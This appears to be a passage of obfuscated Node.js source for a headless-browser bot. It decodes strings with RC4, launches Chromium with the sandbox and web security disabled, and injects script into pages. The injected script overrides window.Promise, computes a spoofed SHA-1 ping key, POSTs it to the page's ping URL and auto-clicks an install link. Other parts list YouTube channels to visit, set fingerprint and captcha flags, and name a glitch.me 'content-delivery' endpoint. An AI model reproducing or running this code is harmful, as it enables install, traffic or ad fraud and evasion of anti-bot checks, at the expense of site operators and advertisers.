                J[-0xd * -0x5c + 0x4a1 + 0x5 * -0x1d9] = this['block'], J[K >> 0x3c4 + 0x1 * -0x12aa + 0x1a8 * 0x9] |= x[-0x171f * 0x1 + 0x33f + 0x13e3 & K], this['block'] = J[-0xba5 + 0xaaa + 0x10b], K >= 0x63d + -0x2 * -0xe90 + -0x1 * 0x2325 && (this['hashed'] || this['hash'](), J[0x82 * 0x3e + -0xa05 + 0x1577 * -0x1] = this['block'], J[0xd97 + -0xc40 + -0x147] = J[0x1 * -0x2011 + -0x186f + -0x1 * -0x3881] = J[-0x5 * 0x607 + -0x1 * -0x275 + 0x1bb0] = J[0x828 + -0x7 * 0x28 + -0x5 * 0x169] = J[0x1569 + 0x82 + -0x9 * 0x26f] = J[0x3 * 0xa9 + 0x227f * 0x1 + -0x2475] = J[-0x5d * -0x9 + 0x365 + -0x1a9 * 0x4] = J[-0x1 * -0x973 + 0xd * 0x2c8 + -0x2d94] = J[-0xbb3 + 0x1 * -0xe37 + 0x19f2] = J[-0x92 * -0x17 + 0x45 * -0x8b + 0xc31 * 0x2] = J[-0x4 * 0x959 + 0x737 * 0x4 + 0x892] = J[-0x5f7 + -0x25a3 + 0x2ba5] = J[0x3 * -0x25f + 0xde1 + -0x2b * 0x28] = J[0x172 * -0xf + 0xc70 + 0x94b] = J[0xcac * 0x3 + -0x2677 + 0x81] = J[-0xefc + 0x145 * -0x11 + -0x24a0 * -0x1] = 0x55 * 0x41 + -0x1f8e + 0x9f9), J[0xf85 + 0x1abf + -0x2a36] = this['hBytes'] << 0x10 * -0x14b + 0x1389 * 0x1 + 0x12a | this['bytes'] >>> -0xb87 * 0x3 + 0x46f + 0x1e43, J[-0x1421 * -0x1 + 0x33 * 0x2c + -0x1 * 0x1cd6] = this['bytes'] << 0x10c + -0x1772 + 0x1669, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x9 * -0x1bf + 0x1 * -0x1d7a + 0x1 * 0xdd3; J < -0x47 * 0x70 + 0x130 + 0x1e30; ++J)
                K = Q[J - (0x15b5 + -0x21f4 + 0x2 * 0x621)] ^ Q[J - (-0x3 * 0xb11 + -0x21 * 0x1 + -0x8c * -0x3d)] ^ Q[J - (0x57d * 0x5 + 0x3 * 0x935 + 0x1256 * -0x3)] ^ Q[J - (-0xa5 * -0x3a + -0x13e4 + 0x2 * -0x8b7)], Q[J] = K << -0x52 * -0x1f + -0x508 + -0x1 * 0x4e5 | K >>> -0xd2d * -0x2 + -0x14a7 * -0x1 + -0x2ee2;
              for (J = -0x1d * -0x131 + -0xfb3 + -0x12da; J < 0x1169 + -0x1e5a + 0xd05; J += -0x1afb * -0x1 + 0x1ce7 + -0x37dd)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1faa + -0x9ab + 0xc2 * -0x1d | L >>> 0x1ebf + 0x1393 + -0x3237) + (M & N | ~M & O) + P + (0x1d3062f0 + 0x37b11330 * -0x2 + 0xacb43d09) + Q[J] << 0x1 * 0x149 + 0x123d + -0x1386) << 0x2536 + -0x8 * 0x254 + -0x1291 | P >>> -0x1e7 * 0x5 + -0x2227 * -0x1 + -0x1889) + (L & (M = M << -0x1 * 0x2557 + -0x2674 * -0x1 + 0xff * -0x1 | M >>> 0x9 * -0x105 + -0x165e + 0x1f8d * 0x1) | ~L & N) + O + (-0x7652f665 + 0x208904a + 0xceccdfb4) + Q[J + (-0x198c + 0x3 * -0x46c + 0x1 * 0x26d1)] << 0x1102 + 0x11 * 0x15a + -0x27fc) << -0x491 * 0x4 + 0x15fb + 0x16 * -0x2b | O >>> 0x1b20 + 0x33 * -0x53 + -0xa7c) + (P & (L = L << 0x2b * -0xa6 + -0x1e4b + -0x1 * -0x3a4b | L >>> -0x1323 + -0x10ab * 0x1 + 0x23d0) | ~P & M) + N + (0x9d43c21d + -0x178a0b93 + -0x2b373cf1) + Q[J + (-0x47 * -0x3e + -0x5b5 + -0xb7b)] << -0x22d8 + -0x15a8 + 0x1c40 * 0x2) << -0xe8a + 0x1 * -0x180c + 0x269b * 0x1 | N >>> -0xeef + -0x1db7 + -0x4f9 * -0x9) + (O & (P = P << -0x1 * 0x1afb + -0x1f5e + -0x67f * -0x9 | P >>> 0x1 * -0xa7f + -0x7a * 0x49 + 0x2d4b) | ~O & L) + M + (-0x1 * 0x440aa432 + 0x390cd57 + 0x32ff72 * 0x30a) + Q[J + (-0x595 + -0x2573 * -0x1 + -0x1fdb)] << -0xaa1 + -0x44a + 0xeeb) << -0x1fc8 + -0x478 + 0x2445 | M >>> 0x395 + -0x1c6f + -0x18f5 * -0x1) + (N & (O = O << -0xa1b + -0x1 * -0x400 + -0x9 * -0xb1 | O >>> -0x4b9 * -0x3 + 0x1 * 0xd6d + 0x282 * -0xb) | ~N & P) + L + (0xb2ffb726 + -0x18a * 0x430b1 + -0x520a4d23 * 0x1) + Q[J + (-0xb83 + -0xc4 * 0x1 + -0x419 * -0x3)] << 0x1 * 0x187f + 0xf24 + -0x27a3, N = N << -0x18b3 + -0x2 * 0x57b + 0x23c7 | N >>> -0x23fc + -0xf08 + 0x7 * 0x74a;
              for (; J < -0x1f49 + -0x49 * 0xe + 0x236f; J += 0x6 * 0x511 + 0x2b0 * -0x3 + -0x1651)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0xee9 + 0xbd6 * 0x2 + 0x8 * -0x4d2 | L >>> -0x3 * 0x46 + 0x13a1 + -0x12b4) + (M ^ N ^ O) + P + (0x6589d643 + 0xbca1e723 + -0xd5 * 0xd78531) + Q[J] << 0x144a + 0x2681 * 0x1 + 0x1399 * -0x3) << 0x1 * 0xb2a + 0x59 * 0x43 + -0x2270 | P >>> 0x1f45 + 0x2d * -0x1a + -0x1a98) + (L ^ (M = M << 0x2ad * 0xa + 0x132c + -0x2dd0 | M >>> -0x58e + 0x1 * 0x1cb5 + -0xf * 0x18b) ^ N) + O + (0x3e1c0b8 + 0x1fb * 0x5cf77a + -0x4d25f3b5) + Q[J + (-0xd79 * 0x1 + 0x11e1 + -0x467)] << 0x14d * 0x16 + 0x1 * 0x1e61 + -0x3aff) << -0x1807 * -0x1 + 0x26f4 + -0x3ef6 | O >>> -0x5d5 * -0x5 + -0x1204 + -0xb0a) + (P ^ (L = L << -0x19fd + 0x2015 * 0x1 + -0x5fa | L >>> -0x1 * 0x1525 + -0x1 * 0x2597 + 0x67 * 0x92) ^ M) + N + (-0x868521c5 + -0x2279 * -0x3ff9 + 0xecc1beb5) + Q[J + (-0x6 * -0xd4 + 0x12f9 + 0x17ef * -0x1)] << -0x1 * 0x217e + 0x2080 * 0x1 + 0x1 * 0xfe) << -0x1 * -0x115b + -0xf7c + -0x1da | N >>> 0xf26 + 0x607 * 0x1 + -0x2 * 0xa89) + (O ^ (P = P << -0x2 * -0x12b9 + 0x3fd + 0x2951 * -0x1 | P >>> 0x6bf + 0x19af + -0x206c) ^ L) + M + (-0x5db8c2b5 + -0xc802cde * -0x2 + 0xb392549a) + Q[J + (-0x15b1 * 0x1 + 0x16f * -0x15 + -0x3 * -0x1145)] << 0x22 + 0x1784 + -0x2 * 0xbd3) << -0x93 * -0x2 + 0x56 * -0x5a + 0x1d1b | M >>> -0x104a + -0xedc + 0x379 * 0x9) + (N ^ (O = O << 0x402 * 0x6 + 0x1564 + 0x2d52 * -0x1 | O >>> -0x1aae + 0x1c11 + -0x161) ^ P) + L + (0x23bd7773 + -0x12bd5 * 0xa13 + -0x32ef * -0x1b4d3) + Q[J + (0x21b7 + 0xdc1 + -0x2f74)] << -0x17f * 0x7 + 0x22 * 0xe3 + -0x13ad * 0x1, N = N << -0x144f * -0x1 + -0x1915 * -0x1 + -0x2d46 | N >>> 0x21b * 0x9 + -0x1 * 0x2b3 + 0x3f * -0x42;
              for (; J < 0x210a + 0x36c * 0x2 + 0x1 * -0x27a6; J += -0x1db7 * 0x1 + 0x1d28 + 0x94)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1a47 + 0x59e * -0x1 + -0x14a4 | L >>> 0x77 * 0x17 + 0x58a * 0x7 + -0x315c) + (M & N | M & O | N & O) + P - (-0xbed3a1c9 * -0x1 + -0x630ccab * -0x2 + -0x5a50f7fb) + Q[J] << 0xc8b + 0x248b + -0x3116) << 0x381 * -0x5 + -0xa * 0x2de + 0x2e36 | P >>> -0x1334 + 0x163f + -0x2f * 0x10) + (L & (M = M << -0x1f22 + 0x1a21 + 0x1b5 * 0x3 | M >>> -0x45a + 0x568 * 0x3 + -0xbdc) | L & N | M & N) + O - (-0xa8fd3235 + -0x34bbebd * 0x41 + 0x1f01ce356) + Q[J + (0x683 * -0x1 + -0x3 * 0x338 + 0x9 * 0x1cc)] << 0x1a * 0x17 + 0x1c1 * -0xc + -0x95b * -0x2) << -0x1330 + 0x2 * 0xe23 + -0x911 | O >>> -0x2535 + 0x13 + 0x253d * 0x1) + (P & (L = L << 0x99a + 0x2ad * -0x4 + 0x138 | L >>> -0x344 * 0x3 + -0x518 + -0x773 * -0x2) | P & M | L & M) + N - (0x89b3e6ef + 0x27c7 * 0x8ae9 + -0x2e651dea) + Q[J + (0x6fb + -0x1d0c + 0x1613)] << -0x1f0d * 0x1 + -0x14ce + 0x33db) << 0x9be * -0x2 + -0x1 * 0x2474 + -0x3bb * -0xf | N >>> -0x2101 + -0x1 * 0x7c3 + 0x28df) + (O & (P = P << 0x101 * -0x7 + 0xe6 * -0x4 + 0xabd | P >>> -0xd09 * -0x2 + -0xb4f + -0x4eb * 0x3) | O & L | P & L) + M - (-0x2aa2de * 0x346 + -0x25468d12 * -0x6 + 0x2e168be * 0xa) + Q[J + (0x243 * -0x1 + -0x1 * -0x137b + 0x371 * -0x5)] << 0x96b + 0x1404 + 0x37 * -0x89) << -0xe9b * 0x1 + 0xd * 0x29 + 0xc8b | M >>> -0x605 * 0x1 + -0x2405 + 0x1 * 0x2a25) + (N & (O = O << -0x3 * 0xcb3 + -0x1e95 * 0x1 + 0x44cc | O >>> -0x4cd + -0xcd0 + 0x119f) | N & P | O & P) + L - (0x2b * -0x107202a + 0xdf08b517 + -0x15fb58f7 * 0x3) + Q[J + (-0x190f * 0x1 + 0xfe0 * 0x1 + 0x933)] << 0x462 + -0xc1c + 0x7ba, N = N << 0x16 * -0x17 + 0x2011 + -0x1df9 | N >>> -0x239c + 0x6fa * 0x1 + 0x1ca4;
              for (; J < -0x153 + -0x2493 * 0x1 + -0x1 * -0x2636; J += 0x1 * 0x2231 + 0x186f + -0x3a9b)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x5 * 0x4b2 + -0x21d + 0x199c | L >>> -0x13d7 + 0x79f + 0xc53 * 0x1) + (M ^ N ^ O) + P - (0x1d957b44 + -0x1 * 0x2ae82cdf + 0x42efefc5) + Q[J] << -0x814 + 0x140f + -0xbfb) << -0x22 * -0x5c + -0x159d + 0x96a | P >>> -0x3 * 0x92 + 0x1868 * 0x1 + -0x1 * 0x1697) + (L ^ (M = M << -0x53 * 0x68 + 0xf78 + 0x125e | M >>> 0x97d + 0x14 * -0x1c5 + 0x19e9) ^ N) + O - (-0x3 * -0x1cde1b5c + -0x324f7ad3 + 0x115266e9) + Q[J + (0x1249 + -0x693 + -0xbb5)] << 0x14e8 + 0x1 * -0x189e + 0x3b6) << -0xc25 + 0x189f + -0x427 * 0x3 | O >>> -0x2 * 0x1064 + -0x10d6 * 0x1 + 0x31b9) + (P ^ (L = L << -0x3b2 + -0x377 * 0xb + 0x29ed | L >>> -0x23b * -0x9 + 0x5be * 0x1 + -0x19cf) ^ M) + N - (-0x65a6c8ed + 0x160f * -0x1fe39 + 0xc73ad26e) + Q[J + (-0xa24 + 0x23e9 * -0x1 + 0x2e0f)] << -0x1148 + -0x22ad + 0x33f5) << -0x392 + -0x623 + -0x19f * -0x6 | N >>> -0x2313 + -0x1 * -0xefd + -0x1 * -0x1431) + (O ^ (P = P << 0x16ad + -0x9 * -0x45 + 0xd * -0x1ec | P >>> -0x1b3d + -0x29c * 0xc + 0x3a8f) ^ L) + M - (0x1d209c1 * 0x15 + 0x1ee553e * 0x11 + -0x1 * 0x117137c9) + Q[J + (0x1a1c + 0x1 * -0x939 + -0x10e0)] << 0x53 * -0x14 + 0x86e + 0x1f2 * -0x1) << -0x1df3 + 0x1 * -0x7d + -0x3 * -0xa27 | M >>> 0x187c + -0x1 * -0x1edd + 0x935 * -0x6) + (N ^ (O = O << 0x1e9 * 0x11 + 0x1f * 0x65 + -0x36e * 0xd | O >>> -0x256f * 0x1 + -0x2255 * 0x1 + 0x47c6) ^ P) + L - (-0x389aa2d3 + 0x20b8b03f + 0x2 * 0x26bf985f) + Q[J + (-0xcd2 + 0xbfc + -0x1 * -0xda)] << -0x207c + 0x5a1 * -0x4 + 0x3700, N = N << -0x17 + 0x6 * -0x220 + 0xcf5 * 0x1 | N >>> 0x1f83 * -0x1 + 0x1d * 0x47 + 0x177a;
              this['h0'] = this['h0'] + L << 0x1 * 0x563 + 0x763 * 0x4 + -0x22ef, this['h1'] = this['h1'] + M << -0x2 * 0xcbb + -0xe1e + 0x2794, this['h2'] = this['h2'] + N << 0x7 * 0x3b3 + -0x1 * -0xedb + -0x28c0, this['h3'] = this['h3'] + O << 0xa33 * 0x2 + 0x6 * -0x4d0 + -0xa * -0xd9, this['h4'] = this['h4'] + P << 0x12 * -0x142 + 0x6fa + 0xfaa;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x1 * -0x17a1 + 0xe24 + 0x999 & 0x939 + -0x1e8d + 0x1563] + w[J >> -0x1 * 0x8ff + -0x224f + 0x2b66 & 0x2098 + -0x1f2f + -0x15a] + w[J >> 0xf32 + -0x16c0 + -0x2 * -0x3d1 & -0xe * -0xe3 + -0xb * 0x20b + 0xa1e] + w[J >> 0xfd4 + 0x20 * -0xec + 0xdbc & -0x1635 + -0x24fa + 0x3b3e] + w[J >> -0x19cb + 0x20de * 0x1 + -0x707 & 0x1b11 + 0x1b3 * -0x16 + 0xa60 * 0x1] + w[J >> 0x12f8 + -0x1 * 0x1795 + -0x1d * -0x29 & 0x1 * -0x244d + -0x1a25 + -0x1 * -0x3e81] + w[J >> -0xa96 + -0xba6 + 0x1640 & 0x587 * -0x3 + 0x1048 * 0x2 + -0xfec] + w[0x26ca + 0xa91 * 0x3 + -0x466e & J] + w[K >> -0x142f + 0xed1 + 0x57a & 0x7 * 0xd1 + -0x88 * 0x3d + 0x1ac0] + w[K >> -0x26b0 + -0x1633 + 0x1 * 0x3cfb & -0x1f3e + -0x50b + 0x916 * 0x4] + w[K >> 0x1 * -0x179c + 0x812 + -0x1 * -0xf9e & -0x1e13 + -0x19 * 0x169 + -0x4163 * -0x1] + w[K >> 0x5d * 0x3 + -0x19d7 + -0x31a * -0x8 & 0x1dd6 + 0x1aa0 + -0x3867] + w[K >> 0x1d6d + 0x64 * 0x32 + -0x30e9 & -0x1ded + 0x2 * 0x824 + -0x6da * -0x2] + w[K >> 0xe38 + 0x1c * 0xcf + 0x2 * -0x126a & -0x2e * -0x1 + -0x4 * 0x92 + -0x4f * -0x7] + w[K >> -0xa4c + 0x1de8 + -0x1398 & 0x1 * 0x1459 + -0x7 * 0x30d + 0x111] + w[-0xe4d + 0x7a5 + 0x6b7 & K] + w[L >> 0xa1f * 0x1 + -0x26be + 0x1cbb & 0xd7 * -0x6 + 0x617 + -0xfe] + w[L >> -0x79 * 0x4d + 0x13 * -0xe + 0x2587 & -0x509 * -0x1 + -0x1 * -0x4f + -0x21 * 0x29] + w[L >> -0x2074 + -0x1 * 0x5d + 0x20e5 & 0x1cf9 * 0x1 + -0x55a + -0x1790] + w[L >> 0x1364 + -0xa * 0x24b + 0x39a & -0xf69 + 0x1 * -0x2597 + 0x350f] + w[L >> 0x1 * 0x132d + -0x43f * 0x5 + -0x10d * -0x2 & -0x1627 + 0xb2f * 0x1 + -0x3ad * -0x3] + w[L >> 0xbc4 + -0xae0 + -0xdc & 0x2 * 0x326 + -0x2097 + -0xd2d * -0x2] + w[L >> -0x262b + -0xf01 + 0x3530 & -0x1217 + 0x68e + 0x35 * 0x38] + w[-0x196b + 0xc15 + 0xd65 & L] + w[M >> 0x1321 + 0x263c + -0x3941 * 0x1 & -0x1c5 * 0x1 + 0x1c74 + 0xc * -0x238] + w[M >> 0x8c9 + -0x2547 * -0x1 + -0x2df8 & -0x74 * 0x52 + 0x39a * -0x2 + 0x2c6b] + w[M >> -0x1330 + -0x1 * -0x1ab0 + 0x5 * -0x17c & 0x26b * 0xf + 0x987 + -0x2dbd] + w[M >> -0x1ac2 + -0x1826 + -0x7 * -0x748 & 0x2 * 0xfa7 + 0x10ea + -0x1 * 0x3029] + w[M >> -0x1d1d + 0x2 * 0x3ac + 0x15d1 & 0x8 * -0x34 + 0x1 * -0x125c + 0x140b * 0x1] + w[M >> -0x1 * -0x17 + -0xa * -0x139 + -0xc49 & 0x114d + -0xe32 * -0x2 + -0x63 * 0x76] + w[M >> -0x1957 + -0x935 + 0x2290 & 0x180 * -0x5 + 0x105e + -0x8cf] + w[-0x1 * 0x2b3 + -0x136e * 0x1 + 0x5 * 0x470 & M] + w[N >> 0x1a88 + -0x20b2 + 0x646 & 0x2563 + -0x4 * -0x9ba + -0x77 * 0xa4] + w[N >> -0x2a5 * -0x5 + -0x23df * -0x1 + -0x3100 & -0x21f3 + 0xa7 * 0x27 + 0x891] + w[N >> 0x4b8 + 0xbda + 0x107e * -0x1 & 0x1 * -0x1465 + -0x605 + 0x1a79] + w[N >> 0x1e81 * -0x1 + -0x1055 * 0x2 + 0x3f3b & -0x2f2 + 0x1ec + 0x115] + w[N >> 0xc7f + -0x1115 + 0x4a2 * 0x1 & 0xc7c + -0x839 * -0x1 + 0x14a6 * -0x1] + w[N >> 0x1272 + 0xfbb + -0x2225 & 0x1 * -0x779 + 0x40 * -0x7 + 0x948] + w[N >> 0x719 * 0x1 + 0x1296 + -0x19ab & -0x1733 + -0x5dc + 0x1d1e] + w[0x8fb * -0x1 + 0x1027 + -0x71d & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x572 + 0xe4f + -0x13a9 & -0xd70 + -0xde * 0x17 + 0x2261,
                J >> 0xb7 * -0x2f + -0x4 * -0x9ad + 0x1 * -0x50b & 0xca4 + -0xfeb + -0x446 * -0x1,
                J >> -0x2060 * -0x1 + 0x1ad4 + -0x874 * 0x7 & -0x2 * 0xbd0 + -0x16 * -0x5e + 0x25d * 0x7,
                -0x25f6 * 0x1 + 0x17bc + 0xf39 & J,
                K >> -0x1fb5 * 0x1 + -0x1dc9 + -0x2 * -0x1ecb & -0x125d + 0xb6b + -0x1 * -0x7f1,
                K >> -0x1 * -0x2159 + 0x1195 + -0x32de & 0x1 * 0x12ad + -0xcdf + 0x1 * -0x4cf,
                K >> 0x822 + 0x2 * -0x13 + -0x2 * 0x3fa & -0x25e3 + -0x158 * 0x19 + 0x487a,
                -0xc * 0x23d + 0xf60 + 0xc7b & K,
                L >> 0xd50 + 0xb8 + -0xdf0 & 0x1205 + -0xda4 + -0x2 * 0x1b1,
                L >> -0x2 * -0xdb8 + 0x2205 * -0x1 + 0x6a5 & 0x2516 + -0x4cd * -0x5 + -0x3c18,
                L >> -0x1 * -0xb7 + 0x2396 * 0x1 + -0xf * 0x26b & -0x3d8 + -0x1eaf + 0x2386,
                -0x955 + -0x15 * 0x6b + -0x131b * -0x1 & L,
                M >> -0x16 * -0x17f + 0xb71 + -0x2c43 & -0x8ea + -0x4c + 0x367 * 0x3,
                M >> -0x4e1 * -0x2 + 0x219b + 0xf * -0x2e3 & 0x20ee + -0x5f0 + -0x533 * 0x5,
                M >> 0x871 * 0x1 + 0x3d * 0x34 + -0x14cd & 0xcc9 + 0x1942 + -0x250c,
                0x1 * -0x1007 + 0xb8d * -0x1 + 0x1c93 & M,
                N >> -0x1 * 0x2191 + 0x55 * -0x27 + 0x2e9c & -0x113f * 0x1 + 0x1 * 0x28a + 0xfb4,
                N >> -0x269 * 0xb + -0x1 * -0xd61 + -0x699 * -0x2 & 0x1119 * -0x1 + -0x225b + -0x1d * -0x1cf,
                N >> 0x8 * 0x323 + 0x1ae6 + -0x3 * 0x1152 & 0xa83 + -0x6 * -0x5dc + -0x2cac,
                0x245 + 0x1c7d + -0x13 * 0x191 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x942 + 0x1395 + 0x1 * -0x1cc3), (K = new DataView(J))['setUint32'](-0x1d1e * -0x1 + 0x1f3 * -0x1 + -0x5 * 0x56f, this['h0']), K['setUint32'](0x4 * 0x8ad + -0x16fa + -0xbb6, this['h1']), K['setUint32'](-0x1d72 * -0x1 + 0x250c + 0x5e * -0xb5, this['h2']), K['setUint32'](-0x126d + -0x148b + 0x2704, this['h3']), K['setUint32'](0x26cd * 0x1 + -0x76e * -0x5 + -0x4be3 * 0x1, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x2 * -0x5f2 + -0x21d9 * -0x1 + -0x15f5];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x1d36 + -0x205f + 0x3d95;
            J[0x19b1 + -0x1 * -0x1d4d + -0x36fe]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x1c0a + 0x59 * -0x39 + -0x839] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x1 * -0x208b + -0x10ef + 0xef * 0x35), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x23 * -0xd1 + 0x4 * 0x7cc + -0x3bc2;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0x902 + 0x3 * 0xb45 + -0x24f5 * 0x1), Promise['resolve'](-0x859 * 0x4 + 0x6b * 0x9 + 0x1da2);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x1375 + 0x141b * 0x1 + -0xa6; j < -0x1 * 0x21a + 0x7e1 * -0x3 + 0x19be; j++)
    i();
}
const NETWORK_PATIENCE = -0xbb * -0x4f + -0x8d * -0x37 + -0x38c0 + (-0x91 + -0x2016 + -0x1 * -0x2c5f) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x911 * -0x3 + -0x30f * -0x2 + 0x6 * -0x58d) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + T(0x14) + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x268e + 0x12d6 + -0x13b8 * -0x1);
    let h = e[f];
    if (b['JjhFVa'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x1a5 * -0x8 + 0x2637 + 0x1 * -0x335f, s, t, u = -0xa81 + -0xcd8 * 0x2 + 0x55 * 0x6d; t = n['charAt'](u++); ~t && (s = r % (0xa * 0x3d0 + -0x268d + 0x71 * 0x1) ? s * (-0x9a * -0xa + -0x5f3 * -0x5 + -0x2383) + t : t, r++ % (-0x1b3a + -0x1dfb + 0x3939)) ? p += String['fromCharCode'](0xe * 0x179 + -0x6c * -0x3d + -0x2d5b & s >> (-(0x1 * -0x765 + 0x13b7 + -0xc50) * r & -0x1eca + 0x3 * -0x404 + 0x2adc)) : 0x1 * 0x24fb + -0x25e3 + 0xe8) {
          t = o['indexOf'](t);
        }
        for (let v = 0x35f + -0x1 * -0x18b9 + -0x8 * 0x383, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x66 * -0x21 + 0x76 * 0x3b + -0x2848))['slice'](-(0x1229 * 0x1 + -0x1 * -0x12cd + -0x24f4));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x192a + -0x1f8a * 0x1 + 0x4c * 0xbf,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x215f + 0x1a * 0x3c + -0x1 * 0x2777; u < 0x2063 * 0x1 + -0x1 * 0x274 + -0x1cef; u++) {
          p[u] = u;
        }
        for (u = 0x2172 * 0x1 + -0x525 + -0x1c4d; u < 0x7 * -0x2af + 0x13e * -0x17 + 0x305b; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x2 * -0xfbb + -0xdcc + -0x10aa), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x132b + 0xacf * -0x3 + 0xd42, q = 0x29 * -0x86 + -0x1 * 0x85f + 0x7 * 0x443;
        for (let v = 0x4dc + 0x15d * 0x17 + -0x2437; v < n['length']; v++) {
          u = (u + (0x11f3 + -0x3 * -0x220 + 0x1 * -0x1852)) % (0x25 * 0x28 + -0x1a * -0x4f + 0x2 * -0x667), q = (q + p[u]) % (0x1b2 + 0x63 + -0x115 * 0x1), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x4e1 * 0x5 + 0x183a + 0x17 * 0xd)]);
        }
        return t;
      };
      b['UelxBX'] = m, c = arguments, b['JjhFVa'] = !![];
    }
    const j = e[0x67 * 0x58 + -0x21e6 + -0x182],
      k = f + j,
      l = c[k];
    return !l ? (b['ERchtz'] === undefined && (b['ERchtz'] = !![]), h = b['UelxBX'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
((() => {
  const U = b;
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x2116 + 0x1 * 0x64e + -0x2 * 0x13b2; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype'][U(0x19, 'Aabt') + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x268e + 0x12d6 + -0x13b8 * -0x1);
    let h = e[f];
    return h;
  }, d(b, c);
}
let searchTerms = [];
